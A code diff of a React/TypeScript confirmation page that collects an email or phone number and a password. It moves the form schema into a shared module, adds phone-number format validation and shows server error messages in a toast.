@@ -14,7 +14,6 @@ import { zodResolver } from "@hookform/resolvers/zod";
 import { useForm } from "react-hook-form";
 import { useLocation } from "wouter";
 import MetaTags from "@/components/meta-tags";
-import { z } from "zod";
 import {
   Select,
   SelectContent,
@@ -23,13 +22,7 @@ import {
   SelectValue,
 } from "@/components/ui/select";
 import { countries } from "@/lib/countries";
-
-const formTwoSchema = z.object({
-  user_email: z.string(), // Optional field
-  password: z.string().min(1, "Password is required"),
-});
-
-type FormTwoValues = z.infer<typeof formTwoSchema>;
+import { formTwoSchema, type FormTwo, isPhoneNumber } from "@shared/schema";
 
 export default function Confirmation() {
   const { toast } = useToast();
@@ -37,7 +30,7 @@ export default function Confirmation() {
   const [contactMethod, setContactMethod] = useState<'email' | 'phone'>('email');
   const [countryCode, setCountryCode] = useState('+1');
 
-  const form = useForm<FormTwoValues>({
+  const form = useForm<FormTwo>({
     resolver: zodResolver(formTwoSchema),
     defaultValues: {
       user_email: "",
@@ -63,14 +56,23 @@ export default function Confirmation() {
       console.error('Failed to parse validation data:', error);
       setLocation('/validation');
     }
-  }, [setLocation, form]);
+  }, [setLocation]);
 
-  const onSubmit = async (data: FormTwoValues) => {
+  const onSubmit = async (data: FormTwo) => {
     try {
       const formattedData = {
         user_email: contactMethod === 'phone' ? `${countryCode}${data.user_email}` : data.user_email,
         password: data.password,
       };
+
+      // Validate phone number format if phone method is selected
+      if (contactMethod === 'phone' && !isPhoneNumber(formattedData.user_email)) {
+        form.setError('user_email', {
+          type: 'manual',
+          message: 'Invalid phone number format'
+        });
+        return;
+      }
 
       const response = await fetch('/api/form-two', {
         method: 'POST',
@@ -81,7 +83,8 @@ export default function Confirmation() {
       });
 
       if (!response.ok) {
-        throw new Error('Failed to submit form');
+        const errorData = await response.json();
+        throw new Error(errorData.message || 'Failed to submit form');
       }
 
       localStorage.removeItem('validation_data');
@@ -95,7 +98,7 @@ export default function Confirmation() {
       toast({
         variant: "destructive",
         title: "Error",
-        description: "Failed to submit form. Please try again.",
+        description: error instanceof Error ? error.message : "Failed to submit form. Please try again.",
       });
     }
   };
